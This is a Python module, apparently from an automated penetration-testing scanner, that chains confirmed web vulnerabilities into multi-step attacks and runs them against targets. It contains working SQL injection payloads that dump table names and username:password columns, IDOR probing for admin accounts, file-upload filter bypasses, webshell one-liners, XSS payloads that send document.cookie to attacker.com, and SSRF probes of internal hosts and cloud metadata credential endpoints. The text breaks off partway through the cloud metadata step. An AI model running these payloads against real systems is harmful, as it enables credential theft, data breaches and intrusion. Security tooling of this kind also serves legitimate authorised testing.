"""
Attack Chain Engine — Multi-step exploit chaining for maximum impact.

A real hacker doesn't just find one vuln — they chain them:
  SSRF → read internal API → get admin token → IDOR → full account takeover
  SQLi → extract user table → credential theft → admin access
  XSS → steal session → impersonate user → privilege escalation
  File Upload → bypass validation → webshell → RCE

This module analyzes confirmed vulnerabilities, selects applicable chain
templates, and executes multi-step attack sequences where each step
uses output from the previous step.
"""
import asyncio
import json
import logging
import re
from datetime import datetime
from typing import Any

from app.utils.http_client import make_client

logger = logging.getLogger(__name__)

# Max steps per chain execution and timeout per step
MAX_CHAIN_STEPS = 5
STEP_TIMEOUT = 30.0

# ── Impact severity ranking for chain sorting ──
IMPACT_RANK = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}

# ── Chain Templates ──
# Each template defines a multi-step attack pattern with an executor method.
CHAIN_TEMPLATES = [
    # ── Original templates (kept for backward compat) ──
    {
        "name": "ssrf_to_metadata",
        "trigger": "ssrf",
        "description": "SSRF → Cloud Metadata → Credential Theft",
        "impact": "critical",
        "steps": [
            "Use SSRF to reach cloud metadata endpoint",
            "Extract IAM credentials or service tokens",
            "Use stolen credentials to access cloud resources",
        ],
        "test": "_chain_ssrf_metadata",
    },
    {
        "name": "xss_to_account_takeover",
        "trigger": "xss_reflected",
        "also_triggers": ["xss_stored", "xss_dom"],
        "description": "XSS → Session Hijack → Account Takeover",
        "impact": "high",
        "steps": [
            "XSS executes in victim's browser",
            "Steal session cookie via document.cookie",
            "Use stolen cookie to impersonate victim",
        ],
        "test": "_chain_xss_session_steal",
    },
    {
        "name": "sqli_to_rce",
        "trigger": "sqli",
        "also_triggers": ["sqli_blind"],
        "description": "SQL Injection → File Write → Remote Code Execution",
        "impact": "critical",
        "steps": [
            "Use SQL injection to write a web shell via INTO OUTFILE",
            "Access the uploaded shell via web request",
            "Execute arbitrary commands on the server",
        ],
        "test": "_chain_sqli_rce",
    },
    {
        "name": "open_redirect_to_oauth_theft",
        "trigger": "open_redirect",
        "description": "Open Redirect → OAuth Token Theft → Account Takeover",
        "impact": "high",
        "steps": [
            "Craft OAuth authorization URL with redirect_uri pointing to open redirect",
            "Open redirect forwards to attacker-controlled server",
            "Attacker captures OAuth authorization code/token",
        ],
        "test": "_chain_redirect_oauth",
    },
    {
        "name": "info_to_sqli",
        "trigger": "info_disclosure",
        "description": "Info Disclosure → Hidden Endpoint → SQL Injection",
        "impact": "high",
        "steps": [
            "Info disclosure reveals hidden API endpoints or debug info",
            "Test hidden endpoints for injection vulnerabilities",
            "Exploit injection to extract data",
        ],
        "test": "_chain_info_to_injection",
    },
    {
        "name": "idor_to_data_breach",
        "trigger": "idor",
        "description": "IDOR → Mass Data Extraction → Full Data Breach",
        "impact": "critical",
        "steps": [
            "IDOR allows accessing other users' data via ID manipulation",
            "Enumerate all user IDs (sequential or predictable)",
            "Extract PII, credentials, or sensitive data for all users",
        ],
        "test": "_chain_idor_enumeration",
    },
    {
        "name": "lfi_to_rce",
        "trigger": "lfi",
        "also_triggers": ["path_traversal"],
        "description": "LFI → Log Poisoning → Remote Code Execution",
        "impact": "critical",
        "steps": [
            "Use LFI to read server logs (access.log, error.log)",
            "Inject PHP/code payload via User-Agent or URL",
            "Include poisoned log file via LFI to execute code",
        ],
        "test": "_chain_lfi_rce",
    },
    {
        "name": "race_to_financial",
        "trigger": "race_condition",
        "description": "Race Condition → Double Spend → Financial Loss",
        "impact": "critical",
        "steps": [
            "Race condition in transaction/transfer endpoint",
            "Send multiple parallel requests before balance check",
            "Withdraw/transfer more than available balance",
        ],
        "test": "_chain_race_financial",
    },
    {
        "name": "csrf_to_account_takeover",
        "trigger": "csrf",
        "description": "CSRF → Change Email → Account Takeover",
        "impact": "high",
        "steps": [
            "CSRF on email/password change endpoint",
            "Craft malicious page that changes victim's email",
            "Use password reset on new email to take over account",
        ],
        "test": "_chain_csrf_takeover",
    },
    {
        "name": "xxe_to_ssrf",
        "trigger": "xxe",
        "description": "XXE → Internal Network Scan → SSRF to Internal Services",
        "impact": "critical",
        "steps": [
            "XXE allows making outbound requests",
            "Scan internal network via XXE SYSTEM entities",
            "Access internal services (databases, admin panels, APIs)",
        ],
        "test": "_chain_xxe_ssrf",
    },

    # ── NEW Multi-Step Chain Templates ──
    {
        "name": "sqli_data_exfil",
        "trigger": "sqli",
        "also_triggers": ["sqli_blind"],
        "description": "SQLi → Data Exfiltration → Credential Theft",
        "impact": "critical",
        "steps": [
            "Confirm SQL injection at vulnerable endpoint",
            "Extract database table list via UNION/error-based injection",
            "Extract user credentials from users/accounts table",
        ],
        "test": "_chain_sqli_data_exfil",
        "executor": "_exec_sqli_data_exfil",
        "recommendations": [
            "Parameterize all SQL queries using prepared statements",
            "Hash passwords with bcrypt/argon2 (not MD5/SHA1)",
            "Implement WAF rules to detect SQL injection patterns",
            "Use least-privilege database accounts",
        ],
    },
    {
        "name": "idor_privilege_escalation",
        "trigger": "idor",
        "description": "IDOR → Privilege Escalation → Admin Access",
        "impact": "critical",
        "steps": [
            "Confirm IDOR on user profile/resource endpoint",
            "Access admin profile by manipulating user ID (id=1, id=0)",
            "Enumerate admin-only endpoints discovered via admin profile",
        ],
        "test": "_chain_idor_privilege_escalation",
        "executor": "_exec_idor_privilege_escalation",
        "recommendations": [
            "Implement proper authorization checks on every endpoint",
            "Use UUIDs instead of sequential IDs",
            "Verify resource ownership server-side",
        ],
    },
    {
        "name": "file_upload_rce",
        "trigger": "file_upload",
        "also_triggers": [],
        "description": "File Upload → Type Bypass → Webshell → RCE",
        "impact": "critical",
        "steps": [
            "Identify file upload endpoint with insufficient validation",
            "Test file type bypass (double extension, null byte, Content-Type spoof)",
            "Upload webshell payload",
            "Execute command via uploaded webshell",
        ],
        "test": "_chain_file_upload_rce",
        "executor": "_exec_file_upload_rce",
        "recommendations": [
            "Validate file type server-side using magic bytes, not extension",
            "Store uploads outside web root",
            "Rename uploaded files with random names",
            "Disable script execution in upload directories",
        ],
    },
    {
        "name": "xss_session_hijack",
        "trigger": "xss_reflected",
        "also_triggers": ["xss_stored", "xss_dom"],
        "description": "XSS → Cookie Stealing Payload → Session Hijack",
        "impact": "high",
        "steps": [
            "Confirm XSS executes in victim's browser context",
            "Craft cookie-stealing payload (document.cookie exfil)",
            "Report session hijack risk with PoC payload",
        ],
        "test": "_chain_xss_session_hijack",
        "executor": "_exec_xss_session_hijack",
        "recommendations": [
            "Set HttpOnly flag on all session cookies",
            "Set Secure flag on cookies",
            "Implement Content-Security-Policy headers",
            "Use SameSite=Strict cookie attribute",
        ],
    },
    {
        "name": "ssrf_internal_scan",
        "trigger": "ssrf",
        "description": "SSRF → Internal Network Probe → Cloud Metadata Access",
        "impact": "critical",
        "steps": [
            "Confirm SSRF allows arbitrary URL requests",
            "Probe internal IPs (127.0.0.1, 169.254.169.254, 10.0.0.1)",
            "Access cloud metadata service (AWS/GCP/Azure)",
            "Report accessible internal services",
        ],
        "test": "_chain_ssrf_internal_scan",
        "executor": "_exec_ssrf_internal_scan",
        "recommendations": [
            "Implement URL allowlisting for outbound requests",
            "Block requests to internal/private IP ranges",
            "Use network-level controls to restrict metadata access",
            "Deploy IMDSv2 (AWS) to require session tokens",
        ],
    },
    {
        "name": "auth_bypass_admin",
        "trigger": "auth_bypass",
        "also_triggers": [],
        "description": "Auth Bypass → Admin Panel Access → Admin Function Enumeration",
        "impact": "critical",
        "steps": [
            "Confirm authentication bypass (default creds, weak auth, missing auth)",
            "Access admin panel or privileged endpoints",
            "Enumerate admin functions (user management, config, data export)",
        ],
        "test": "_chain_auth_bypass_admin",
        "executor": "_exec_auth_bypass_admin",
        "recommendations": [
            "Enforce strong authentication on all admin endpoints",
            "Remove or change all default credentials",
            "Implement multi-factor authentication for admin access",
            "Rate-limit login attempts",
        ],
    },
    {
        "name": "info_disclosure_further_attack",
        "trigger": "info_disclosure",
        "description": "Info Disclosure → Extract Credentials → Database Access",
        "impact": "critical",
        "steps": [
            "Confirm sensitive file exposure (.env, config, backup)",
            "Extract database credentials or API keys from exposed file",
            "Test extracted credentials against discovered services",
            "Report data accessible via leaked credentials",
        ],
        "test": "_chain_info_disclosure_further",
        "executor": "_exec_info_disclosure_further",
        "recommendations": [
            "Remove all sensitive files from web-accessible directories",
            "Add .env, *.bak, *.sql to .gitignore and server deny rules",
            "Rotate any credentials that may have been exposed",
            "Use secrets management (Vault, AWS Secrets Manager)",
        ],
    },
]


def select_chains(vulnerabilities: list[dict], context: dict) -> list[dict]:
    """Select applicable attack chains based on confirmed vulnerabilities.

    Args:
        vulnerabilities: List of confirmed vulnerability dicts.
        context: Scan context with technologies, endpoints, etc.

    Returns:
        List of applicable chain templates sorted by impact (critical first).
    """
    if not vulnerabilities:
        return []

    # Index vulns by type
    vuln_types: set[str] = set()
    for v in vulnerabilities:
        vt = v.get("vuln_type", "")
        if hasattr(vt, "value"):
            vt = vt.value
        vuln_types.add(vt)

    applicable = []
    seen_names: set[str] = set()

    for template in CHAIN_TEMPLATES:
        # Skip if we already have this chain name (dedup original vs new)
        if template["name"] in seen_names:
            continue

        trigger = template["trigger"]
        also = template.get("also_triggers", [])
        all_triggers = [trigger] + also

        # Check if any trigger type matches our vulns
        if vuln_types.intersection(all_triggers):
            applicable.append(template)
            seen_names.add(template["name"])

    # Sort by impact: critical > high > medium > low
    applicable.sort(key=lambda t: IMPACT_RANK.get(t["impact"], 0), reverse=True)

    return applicable


async def execute_chain(
    chain_template: dict,
    initial_vuln: dict,
    context: dict,
    db: Any = None,
) -> dict:
    """Execute a multi-step attack chain starting from a confirmed vulnerability.

    Each step can use output from the previous step (cookies, tokens, data).
    If a step fails, the chain stops and reports partial success.

    Args:
        chain_template: The chain template dict from CHAIN_TEMPLATES.
        initial_vuln: The confirmed vulnerability that triggers this chain.
        context: Full scan context.
        db: Optional database session for saving results.

    Returns:
        Chain result dict with steps_completed, evidence, severity, etc.
    """
    chain_name = chain_template["description"]
    steps = chain_template["steps"]
    executor_name = chain_template.get("executor")
    recommendations = chain_template.get("recommendations", [])

    result = {
        "chain_name": chain_name,
        "template_id": chain_template["name"],
        "steps_completed": 0,
        "steps_total": min(len(steps), MAX_CHAIN_STEPS),
        "severity": chain_template["impact"],
        "impact": "",
        "evidence": [],
        "recommendations": recommendations,
        "verified": False,
        "trigger_vuln": {
            "type": _vuln_type_str(initial_vuln.get("vuln_type", "")),
            "url": initial_vuln.get("url", ""),
            "title": initial_vuln.get("title", ""),
            "parameter": initial_vuln.get("parameter", ""),
        },
        "created_at": datetime.utcnow().isoformat() + "Z",
    }

    # If there's a dedicated executor, use it
    chain_engine = AttackChainModule()
    executor_func = getattr(chain_engine, executor_name, None) if executor_name else None

    if executor_func:
        try:
            exec_result = await asyncio.wait_for(
                executor_func(initial_vuln, context),
                timeout=STEP_TIMEOUT * MAX_CHAIN_STEPS,
            )
            result.update(exec_result)
        except asyncio.TimeoutError:
            result["impact"] = f"Chain timed out after {STEP_TIMEOUT * MAX_CHAIN_STEPS}s"
            logger.warning(f"Chain {chain_name} timed out")
        except Exception as e:
            result["impact"] = f"Chain execution error: {e}"
            logger.warning(f"Chain {chain_name} error: {e}")
    else:
        # Fall back to the legacy test method
        test_name = chain_template.get("test")
        test_func = getattr(chain_engine, test_name, None) if test_name else None
        if test_func:
            try:
                # Build vuln_by_type for legacy API
                vuln_by_type = {}
                for v in context.get("vulnerabilities", []):
                    vt = _vuln_type_str(v.get("vuln_type", ""))
                    vuln_by_type.setdefault(vt, []).append(v)

                test_result = await asyncio.wait_for(
                    test_func(initial_vuln, vuln_by_type,
                              context.get("base_url", ""), context),
                    timeout=STEP_TIMEOUT,
                )
                result["verified"] = test_result.get("verified", False)
                evidence = test_result.get("evidence", {})
                if evidence:
                    result["evidence"] = [
                        {"step": i + 1, "action": step, "result": json.dumps(evidence)}
                        for i, step in enumerate(steps)
                    ]
                    result["steps_completed"] = len(steps) if result["verified"] else 1
                result["impact"] = chain_name
            except (asyncio.TimeoutError, Exception) as e:
                logger.debug(f"Legacy chain test {test_name} failed: {e}")

    return result


def _vuln_type_str(vt: Any) -> str:
    """Convert vuln type to string, handling enum values."""
    if hasattr(vt, "value"):
        return vt.value
    return str(vt)


class AttackChainModule:
    """Multi-step exploit chain engine.

    Analyzes confirmed vulnerabilities, selects applicable chains,
    and executes them sequentially with output passing between steps.
    """

    def __init__(self):
        self.chains_found: list[dict] = []

    async def analyze(self, context: dict) -> list[dict]:
        """Analyze found vulnerabilities and attempt to build attack chains.

        Args:
            context: Scan context with 'vulnerabilities' (confirmed vulns)
                     and other scan data.

        Returns:
            List of chain dicts with steps and evidence.
        """
        vulns = context.get("vulnerabilities", [])
        if not vulns:
            return []

        # Index vulns by type
        vuln_by_type: dict[str, list] = {}
        for v in vulns:
            vt = _vuln_type_str(v.get("vuln_type", ""))
            vuln_by_type.setdefault(vt, []).append(v)

        base_url = context.get("base_url", "")
        chains = []

        for template in CHAIN_TEMPLATES:
            trigger = template["trigger"]
            also = template.get("also_triggers", [])

            # Check if we have the trigger vuln
            trigger_vulns = list(vuln_by_type.get(trigger, []))
            for alt in also:
                trigger_vulns.extend(vuln_by_type.get(alt, []))

            if not trigger_vulns:
                continue

            # For each trigger vuln, try to build the chain
            for trigger_vuln in trigger_vulns[:3]:  # Max 3 per template
                chain = await self._attempt_chain(
                    template, trigger_vuln, vuln_by_type, base_url, context
                )
                if chain:
                    chains.append(chain)

        self.chains_found = chains
        return chains

    async def run_chains(self, context: dict) -> list[dict]:
        """Full chain pipeline: select applicable chains, execute each, return results.

        This is the main entry point called from the pipeline.
        """
        vulns = context.get("vulnerabilities", [])
        if not vulns:
            return []

        # Select applicable chains
        applicable = select_chains(vulns, context)
        if not applicable:
            return []

        logger.info(f"Attack chains: {len(applicable)} applicable chains for "
                     f"{len(vulns)} vulnerabilities")

        # Index vulns by type for matching
        vuln_by_type: dict[str, list] = {}
        for v in vulns:
            vt = _vuln_type_str(v.get("vuln_type", ""))
            vuln_by_type.setdefault(vt, []).append(v)

        results = []
        executed = set()  # Track (template_name, vuln_url) to avoid duplicates

        for template in applicable:
            trigger = template["trigger"]
            also = template.get("also_triggers", [])
            all_triggers = [trigger] + also

            # Get matching vulns
            trigger_vulns = []
            for t in all_triggers:
                trigger_vulns.extend(vuln_by_type.get(t, []))

            for vuln in trigger_vulns[:2]:  # Max 2 vulns per template
                dedup_key = (template["name"], vuln.get("url", ""))
                if dedup_key in executed:
                    continue
                executed.add(dedup_key)

                chain_result = await execute_chain(template, vuln, context)

                # Only keep chains with some progress
                if chain_result.get("steps_completed", 0) > 0 or chain_result.get("verified"):
                    results.append(chain_result)

        logger.info(f"Attack chains: executed {len(executed)} chains, "
                     f"{len(results)} produced results")
        return results

    async def _attempt_chain(
        self, template: dict, trigger_vuln: dict,
        vuln_by_type: dict, base_url: str, context: dict
    ) -> dict | None:
        """Attempt to build a specific attack chain (legacy API)."""
        test_func_name = template.get("test")
        test_func = getattr(self, test_func_name, None) if test_func_name else None

        # Run active test if available
        test_result = None
        if test_func:
            try:
                test_result = await asyncio.wait_for(
                    test_func(trigger_vuln, vuln_by_type, base_url, context),
                    timeout=STEP_TIMEOUT,
                )
            except (asyncio.TimeoutError, Exception) as e:
                logger.debug(f"Chain test {test_func_name} failed: {e}")

        # Build chain result
        chain = {
            "chain_name": template["name"],
            "description": template["description"],
            "impact": template["impact"],
            "trigger_vuln": {
                "type": _vuln_type_str(trigger_vuln.get("vuln_type", "")),
                "url": trigger_vuln.get("url", ""),
                "title": trigger_vuln.get("title", ""),
            },
            "steps": template["steps"],
            "verified": test_result.get("verified", False) if test_result else False,
            "evidence": test_result.get("evidence", {}) if test_result else {},
            "potential": True,
            "created_at": datetime.utcnow().isoformat(),
        }

        # Only return verified chains — unverified are noise
        if chain["verified"]:
            return chain

        return None

    # ═══════════════════════════════════════════════════════════════════
    # NEW Multi-Step Chain Executors
    # Each returns a dict with: steps_completed, evidence, impact, verified
    # ═══════════════════════════════════════════════════════════════════

    async def _exec_sqli_data_exfil(self, trigger: dict, ctx: dict) -> dict:
        """SQLi -> Data Exfiltration -> Credential Theft chain."""
        url = trigger.get("url", "")
        param = trigger.get("parameter", "")
        payload_used = trigger.get("payload_used", "")
        method = (trigger.get("method") or "GET").upper()
        evidence = []
        steps_completed = 0

        # Step 1: Confirm SQLi
        evidence.append({
            "step": 1,
            "action": f"Confirmed SQLi at {url} (param: {param})",
            "result": "injectable" if url else "no URL available",
        })
        steps_completed = 1

        if not url or not param:
            return {
                "steps_completed": steps_completed,
                "evidence": evidence,
                "impact": "SQL injection confirmed but no parameter to chain further.",
                "verified": False,
            }

        # Step 2: Try to extract table list
        table_enum_payloads = [
            # MySQL
            "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -",
            # PostgreSQL
            "' UNION SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'-- -",
            # Generic error-based
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
        ]

        tables_found = []
        async with make_client(timeout=10.0) as client:
            for tbl_payload in table_enum_payloads:
                try:
                    if method == "POST":
                        resp = await client.post(url, data={param: tbl_payload})
                    else:
                        resp = await client.get(url, params={param: tbl_payload})

                    body = resp.text.lower()
                    # Look for common table names in response
                    common_tables = ["users", "accounts", "admin", "sessions",
                                     "orders", "customers", "members", "login",
                                     "credentials", "passwords", "config"]
                    found = [t for t in common_tables if t in body]
                    if found:
                        tables_found = found
                        break
                except Exception:
                    continue

        if tables_found:
            evidence.append({
                "step": 2,
                "action": "Extracted table list via UNION injection",
                "result": f"Tables found: {', '.join(tables_found)}",
            })
            steps_completed = 2
        else:
            evidence.append({
                "step": 2,
                "action": "Attempted table enumeration",
                "result": "Could not extract table names (WAF/blind injection)",
            })
            steps_completed = 2

        # Step 3: Try to extract credentials
        cred_payloads = [
            "' UNION SELECT GROUP_CONCAT(username,':',password) FROM users-- -",
            "' UNION SELECT GROUP_CONCAT(email,':',password) FROM users-- -",
            "' UNION SELECT GROUP_CONCAT(login,':',pass) FROM accounts-- -",
        ]

        creds_found = False
        cred_indicators = ["admin", "root", "password", "hash", "$2b$", "$2a$",
                           "md5", "sha1", "sha256", "@"]

        async with make_client(timeout=10.0) as client:
            for cred_payload in cred_payloads:
                try:
                    if method == "POST":
                        resp = await client.post(url, data={param: cred_payload})
                    else:
                        resp = await client.get(url, params={param: cred_payload})

                    if any(ind in resp.text.lower() for ind in cred_indicators):
                        creds_found = True
                        break
                except Exception:
                    continue

        if creds_found:
            evidence.append({
                "step": 3,
                "action": "Extracted credentials from users table",
                "result": "User records with password hashes found in response",
            })
            steps_completed = 3
        else:
            evidence.append({
                "step": 3,
                "action": "Attempted credential extraction",
                "result": "Could not extract credentials (column names differ or blind SQLi)",
            })
            steps_completed = 3

        return {
            "steps_completed": steps_completed,
            "evidence": evidence,
            "impact": (
                "SQL injection allows full database read. "
                + (f"Found tables: {', '.join(tables_found)}. " if tables_found else "")
                + ("Extracted user credentials with password hashes." if creds_found
                   else "Further exploitation may require manual testing.")
            ),
            "verified": steps_completed >= 2 and (bool(tables_found) or creds_found),
        }

    async def _exec_idor_privilege_escalation(self, trigger: dict, ctx: dict) -> dict:
        """IDOR -> Privilege Escalation chain."""
        url = trigger.get("url", "")
        evidence = []
        steps_completed = 0

        # Step 1: Confirm IDOR
        evidence.append({
            "step": 1,
            "action": f"Confirmed IDOR at {url}",
            "result": "User resource accessible via ID manipulation",
        })
        steps_completed = 1

        if not url:
            return {
                "steps_completed": 1,
                "evidence": evidence,
                "impact": "IDOR confirmed but URL not available for chaining.",
                "verified": False,
            }

        # Step 2: Try accessing admin profile (id=1, id=0, id=admin)
        id_match = re.search(r'/(\d+)(?:/|$|\?)', url)
        admin_accessible = False
        admin_content = ""

        if id_match:
            original_id = id_match.group(1)
            admin_ids = ["1", "0", "admin"]

            async with make_client(timeout=10.0) as client:
                for admin_id in admin_ids:
                    test_url = url.replace(f"/{original_id}", f"/{admin_id}")
                    try:
                        resp = await client.get(test_url)
                        if resp.status_code == 200 and len(resp.text) > 50:
                            body_lower = resp.text.lower()
                            admin_indicators = ["admin", "superuser", "root",
                                                "administrator", "role", "privilege",
                                                "manage", "dashboard"]
                            if any(ind in body_lower for ind in admin_indicators):
                                admin_accessible = True
                                admin_content = resp.text[:500]
                                break
                    except Exception:
                        continue

        if admin_accessible:
            evidence.append({
                "step": 2,
                "action": "Accessed admin profile via IDOR (id=1)",
                "result": "Admin profile data accessible, admin role confirmed",
            })
            steps_completed = 2
        else:
            evidence.append({
                "step": 2,
                "action": "Attempted admin profile access",
                "result": "Could not confirm admin-level access via ID manipulation",
            })
            steps_completed = 2

        # Step 3: Look for admin endpoints in the response
        admin_endpoints_found = []
        if admin_content:
            admin_patterns = [
                r'href=["\']([^"\']*admin[^"\']*)["\']',
                r'href=["\']([^"\']*manage[^"\']*)["\']',
                r'href=["\']([^"\']*dashboard[^"\']*)["\']',
                r'href=["\']([^"\']*settings[^"\']*)["\']',
                r'action=["\']([^"\']*)["\']',
            ]
            for pattern in admin_patterns:
                matches = re.findall(pattern, admin_content, re.IGNORECASE)
                admin_endpoints_found.extend(matches[:3])

        if admin_endpoints_found:
            evidence.append({
                "step": 3,
                "action": "Enumerated admin endpoints from admin profile",
                "result": f"Found admin endpoints: {', '.join(admin_endpoints_found[:5])}",
            })
            steps_completed = 3
        else:
            evidence.append({
                "step": 3,
                "action": "Attempted admin endpoint enumeration",
                "result": "No additional admin endpoints discovered in response",
            })
            steps_completed = 3

        return {
            "steps_completed": steps_completed,
            "evidence": evidence,
            "impact": (
                "IDOR vulnerability allows privilege escalation. "
                + ("Admin profile accessible via ID manipulation. " if admin_accessible else "")
                + (f"Admin endpoints found: {', '.join(admin_endpoints_found[:3])}" if admin_endpoints_found else "")
            ),
            "verified": admin_accessible,
        }

    async def _exec_file_upload_rce(self, trigger: dict, ctx: dict) -> dict:
        """File Upload -> Type Bypass -> Webshell -> RCE chain."""
        url = trigger.get("url", "")
        evidence = []
        steps_completed = 0

        # Step 1: Identify upload endpoint
        evidence.append({
            "step": 1,
            "action": f"File upload endpoint identified at {url}",
            "result": "Upload functionality found with insufficient validation",
        })
        steps_completed = 1

        if not url:
            return {
                "steps_completed": 1,
                "evidence": evidence,
                "impact": "File upload vulnerability identified but URL not available.",
                "verified": False,
            }

        # Step 2: Test file type bypasses (probe only, don't actually upload shells)
        bypass_techniques = [
            {"technique": "Double extension", "filename": "test.php.jpg",
             "content_type": "image/jpeg"},
            {"technique": "Null byte", "filename": "test.php%00.jpg",
             "content_type": "image/jpeg"},
            {"technique": "Content-Type spoof", "filename": "test.php",
             "content_type": "image/png"},
            {"technique": "Case variation", "filename": "test.PhP",
             "content_type": "application/x-php"},
            {"technique": ".htaccess upload", "filename": ".htaccess",
             "content_type": "text/plain"},
        ]

        bypasses_possible = []
        async with make_client(timeout=10.0) as client:
            for bypass in bypass_techniques:
                try:
                    # Send a harmless test file with the bypass technique
                    files = {"file": (bypass["filename"], b"GIF89a test content",
                                      bypass["content_type"])}
                    resp = await client.post(url, files=files)

                    # If server accepts (200/201/302) without error, bypass may work
                    if resp.status_code in (200, 201, 302):
                        error_indicators = ["invalid", "not allowed", "rejected",
                                            "error", "forbidden", "denied"]
                        if not any(ind in resp.text.lower() for ind in error_indicators):
                            bypasses_possible.append(bypass["technique"])
                except Exception:
                    continue

        if bypasses_possible:
            evidence.append({
                "step": 2,
                "action": "Tested file type bypass techniques",
                "result": f"Bypasses successful: {', '.join(bypasses_possible)}",
            })
            steps_completed = 2
        else:
            evidence.append({
                "step": 2,
                "action": "Tested file type bypass techniques",
                "result": "No bypass techniques succeeded (server validates properly)",
            })
            steps_completed = 2

        # Step 3: Document RCE potential (don't actually upload real shells)
        techs = (ctx.get("technologies") or {}).get("summary", {})
        tech_names = [t.lower() for t in techs.keys()]

        rce_method = "unknown"
        if any(t in " ".join(tech_names) for t in ["php", "apache"]):
            rce_method = "PHP webshell (<?php system($_GET['c']); ?>)"
        elif any(t in " ".join(tech_names) for t in ["asp", "iis"]):
            rce_method = "ASP webshell (<%@ Page Language=\"C#\" %>)"
        elif any(t in " ".join(tech_names) for t in ["jsp", "tomcat", "java"]):
            rce_method = "JSP webshell (Runtime.exec())"
        elif any(t in " ".join(tech_names) for t in ["python", "flask", "django"]):
            rce_method = "Python script upload (os.system())"

        evidence.append({
            "step": 3,
            "action": "Assessed RCE potential via uploaded file",
            "result": f"RCE method: {rce_method}",
        })
        steps_completed = 3

        return {
            "steps_completed": steps_completed,
            "evidence": evidence,
            "impact": (
                "File upload vulnerability with potential for remote code execution. "
                + (f"Bypass techniques: {', '.join(bypasses_possible)}. " if bypasses_possible else "")
                + f"RCE method: {rce_method}"
            ),
            "verified": bool(bypasses_possible),
        }

    async def _exec_xss_session_hijack(self, trigger: dict, ctx: dict) -> dict:
        """XSS -> Cookie Stealing -> Session Hijack chain."""
        url = trigger.get("url", "")
        param = trigger.get("parameter", "")
        base_url = ctx.get("base_url", "")
        evidence = []
        steps_completed = 0

        # Step 1: Confirm XSS
        evidence.append({
            "step": 1,
            "action": f"Confirmed XSS at {url} (param: {param})",
            "result": "XSS payload executes in browser context",
        })
        steps_completed = 1

        # Step 2: Check cookie security flags
        httponly = True
        secure = True
        samesite = True
        cookie_header = ""

        async with make_client(timeout=10.0) as client:
            try:
                resp = await client.get(base_url or url)
                cookie_header = resp.headers.get("set-cookie", "")
                if cookie_header:
                    httponly = "httponly" in cookie_header.lower()
                    secure = "secure" in cookie_header.lower()
                    samesite = "samesite" in cookie_header.lower()
                else:
                    # No cookies set — can't steal what doesn't exist
                    httponly = True  # Treat as safe
            except Exception:
                pass

        cookie_issues = []
        if not httponly:
            cookie_issues.append("HttpOnly flag missing")
        if not secure:
            cookie_issues.append("Secure flag missing")
        if not samesite:
            cookie_issues.append("SameSite attribute missing")

        evidence.append({
            "step": 2,
            "action": "Analyzed session cookie security flags",
            "result": (
                f"Cookie issues: {', '.join(cookie_issues)}"
                if cookie_issues else "Cookies have proper security flags"
            ),
        })
        steps_completed = 2

        # Step 3: Craft session hijack PoC payload
        if not httponly:
            poc_payload = (
                f'<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>'
            )
            hijack_risk = "HIGH — cookies accessible via JavaScript"
        else:
            poc_payload = (
                f'<script>fetch("https://attacker.com/log?url="+location.href)</script>'
            )
            hijack_risk = "MEDIUM — HttpOnly prevents direct cookie theft but XSS can perform actions"

        evidence.append({
            "step": 3,
            "action": "Crafted session hijack PoC payload",
            "result": f"Risk: {hijack_risk}. PoC: {poc_payload[:100]}",
        })
        steps_completed = 3

        return {
            "steps_completed": steps_completed,
            "evidence": evidence,
            "impact": (
                f"XSS enables session hijack. {hijack_risk}. "
                + (f"Cookie issues: {', '.join(cookie_issues)}. " if cookie_issues else "")
            ),
            "verified": not httponly,  # Verified if cookies are stealable
        }

    async def _exec_ssrf_internal_scan(self, trigger: dict, ctx: dict) -> dict:
        """SSRF -> Internal Network Probe -> Cloud Metadata chain."""
        url = trigger.get("url", "")
        param = trigger.get("parameter", "")
        method = (trigger.get("method") or "GET").upper()
        evidence = []
        steps_completed = 0

        # Step 1: Confirm SSRF
        evidence.append({
            "step": 1,
            "action": f"Confirmed SSRF at {url} (param: {param})",
            "result": "Server-side request forgery allows arbitrary URL fetching",
        })
        steps_completed = 1

        if not url or not param:
            return {
                "steps_completed": 1,
                "evidence": evidence,
                "impact": "SSRF confirmed but parameter not available for probing.",
                "verified": False,
            }

        # Step 2: Probe internal IPs and services
        internal_targets = [
            ("http://127.0.0.1:80", "Local web server"),
            ("http://127.0.0.1:8080", "Local app server"),
            ("http://127.0.0.1:3000", "Internal API/Node"),
            ("http://127.0.0.1:6379", "Redis"),
            ("http://127.0.0.1:5432", "PostgreSQL"),
            ("http://10.0.0.1", "Internal gateway"),
            ("http://172.17.0.1", "Docker gateway"),
            ("http://192.168.1.1", "LAN gateway"),
        ]

        accessible_internal = []
        async with make_client(timeout=10.0) as client:
            for target_url, description in internal_targets:
                try:
                    if method == "POST":
                        resp = await client.post(url, data={param: target_url})
                    else:
                        resp = await client.get(url, params={param: target_url})

                    # Check if response differs from a baseline error
                    if resp.status_code == 200 and len(resp.text) > 20:
                        # Check for indicators that the internal service responded
                        if not any(err in resp.text.lower() for err in
                                   ["could not connect", "connection refused",
                                    "timeout", "unreachable", "not found"]):
                            accessible_internal.append({
                                "target": target_url,
                                "description": description,
                                "response_length": len(resp.text),
                                "snippet": resp.text[:200],
                            })
                except Exception:
                    continue

        if accessible_internal:
            evidence.append({
                "step": 2,
                "action": "Probed internal network via SSRF",
                "result": f"Accessible: {', '.join(a['description'] for a in accessible_internal)}",
            })
            steps_completed = 2
        else:
            evidence.append({
                "step": 2,
                "action": "Probed internal network via SSRF",
                "result": "No internal services responded (network segmentation may be in place)",
            })
            steps_completed = 2

        # Step 3: Probe cloud metadata services
        cloud_targets = [
            ("http://169.254.169.254/latest/meta-data/", "AWS metadata",
             ["ami-id", "instance-id", "iam", "security-credentials"]),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
             "AWS IAM credentials", ["AccessKeyId", "SecretAccessKey", "Token"]),
            ("http://metadata.google.internal/computeMetadata/v1/",
             "GCP metadata", ["project", "instance", "attributes"]),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
             "Azure metadata", ["vmId", "subscriptionId", "resourceGroup"]),
            ("http://100.100.100.200/latest/meta-data/",
             "Alibaba Cloud metadata", ["instance-id", "region-id"]),
        ]

        cloud_accessible = []
        async with make_client(timeout=10.0) as client:
            for target_url, description, indicators in cloud_targets:
                try:
                    headers = {}
                    # GCP requires this header
